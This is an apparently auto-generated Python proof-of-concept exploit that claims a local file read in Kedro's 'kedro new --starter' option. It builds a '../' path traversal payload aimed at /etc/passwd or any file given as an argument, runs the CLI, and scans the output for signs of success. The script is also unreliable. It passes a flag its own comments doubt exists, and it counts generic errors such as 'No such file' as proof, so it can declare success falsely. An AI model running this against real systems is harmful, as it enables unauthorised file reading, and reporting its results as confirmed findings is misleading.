#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-020
# Sink: _create_project
# Auto-generated — run with: python3 lfi_cli_provided__create_project.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro LFI vulnerability.

The `--starter` flag in `kedro new` is passed directly to `cookiecutter()` without
sanitization. By providing a path traversal payload (e.g., `../../etc/passwd`),
an attacker can read arbitrary files from the filesystem.

This PoC demonstrates the vulnerability by attempting to read `/etc/passwd`.
"""

import argparse
import os
import subprocess
import sys
import tempfile
import shutil

# Configuration
TARGET_HOST = "127.0.0.1"  # Default target (local)
TARGET_PORT = 8080          # Default port (if using remote)
PAYLOAD_FILE = "/etc/passwd"  # Benign file to read (safe default)

def check_kedro_installed():
    """Verify kedro is installed and accessible."""
    try:
        subprocess.run(["kedro", "--version"], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Kedro is not installed or not in PATH.")
        print("[*] Install with: pip install kedro")
        sys.exit(1)

def build_payload(target_file):
    """
    Build a path traversal payload to read the target file.
    Uses enough `../` to escape from the expected template directory.
    """
    # Typical template path: /home/user/.local/lib/python3.14/site-packages/kedro/templates/
    # We need to go up ~6 levels to reach root, then to target file
    traversal = "../" * 6
    return f"{traversal}{target_file.lstrip('/')}"

def attempt_exploit(payload, output_dir):
    """
    Attempt to trigger the LFI by running `kedro new` with the malicious --starter flag.
    
    Args:
        payload: The path traversal payload
        output_dir: Temporary directory for project output
    
    Returns:
        True if the exploit appears to have worked (file content visible in error/output)
    """
    print(f"[*] Attempting exploit with payload: {payload}")
    print(f"[*] Output directory: {output_dir}")
    
    # Run kedro new with the malicious starter path
    # We use --no-cookiecutter to avoid interactive prompts (if supported)
    # Otherwise, we pipe empty input to handle prompts
    cmd = [
        "kedro", "new",
        "--starter", payload,
        "--name", "poc_project",
        "--directory", output_dir,
        "--no-cookiecutter"  # May not be supported in all versions
    ]
    
    try:
        # Try with --no-cookiecutter first
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
        return False
    
    # Check output for signs of file content
    output = result.stdout + result.stderr
    
    # Common indicators of successful file read
    indicators = [
        "root:",           # /etc/passwd content
        "daemon:",         # /etc/passwd content
        "bin:",            # /etc/passwd content
        "Permission denied",  # Partial read
        "No such file",    # File not found (but traversal worked)
        "cookiecutter",    # Error from cookiecutter
    ]
    
    for indicator in indicators:
        if indicator in output:
            print(f"[+] Found indicator: '{indicator}'")
            print(f"[*] Full output:\n{output[:2000]}")  # Show first 2000 chars
            return True
    
    # If --no-cookiecutter failed, try interactive mode with empty input
    if "no-cookiecutter" in result.stderr or "unrecognized" in result.stderr:
        print("[*] --no-cookiecutter not supported, trying interactive mode...")
        cmd = [
            "kedro", "new",
            "--starter", payload,
            "--name", "poc_project",
            "--directory", output_dir,
        ]
        
        try:
            result = subprocess.run(
                cmd,
                input="\n\n\n\n\n\n\n\n\n",  # Provide empty inputs for prompts
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            print(f"[*] Interactive output:\n{output[:2000]}")
            
            # Check for file content in output
            for indicator in indicators:
                if indicator in output:
                    print(f"[+] Found indicator: '{indicator}'")
                    return True
                    
        except subprocess.TimeoutExpired:
            print("[!] Interactive mode timed out")
            return False
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro LFI via --starter flag"
    )
    parser.add_argument(
        "--target",
        default=PAYLOAD_FILE,
        help=f"Target file to read (default: {PAYLOAD_FILE})"
    )
    parser.add_argument(
        "--output-dir",
        default=None,
        help="Directory for project output (default: temp dir)"
    )
    
    args = parser.parse_args()
    
    # Check prerequisites
    check_kedro_installed()
    
    # Create output directory
    if args.output_dir:
        output_dir = args.output_dir
        os.makedirs(output_dir, exist_ok=True)
    else:
        output_dir = tempfile.mkdtemp(prefix="kedro_poc_")
    
    try:
        # Build the payload
        payload = build_payload(args.target)
        print(f"[*] Target file: {args.target}")
        print(f"[*] Payload: {payload}")
        
        # Attempt the exploit
        success = attempt_exploit(payload, output_dir)
        
        if success:
            print("\n[+] EXPLOIT SUCCESSFUL - Vulnerability confirmed!")
            print(f"[*] The payload '{payload}' was used to read '{args.target}'")
            print("[*] Check the output above for file contents")
        else:
            print("\n[-] Exploit did not produce expected output")
            print("[*] This could mean:")
            print("  - The vulnerability has been patched")
            print("  - The payload needs adjustment (try different traversal depth)")
            print("  - The target file doesn't exist")
            print("  - The output was suppressed or redirected")
            
    finally:
        # Cleanup
        if not args.output_dir:
            print(f"[*] Cleaning up temporary directory: {output_dir}")
            shutil.rmtree(output_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
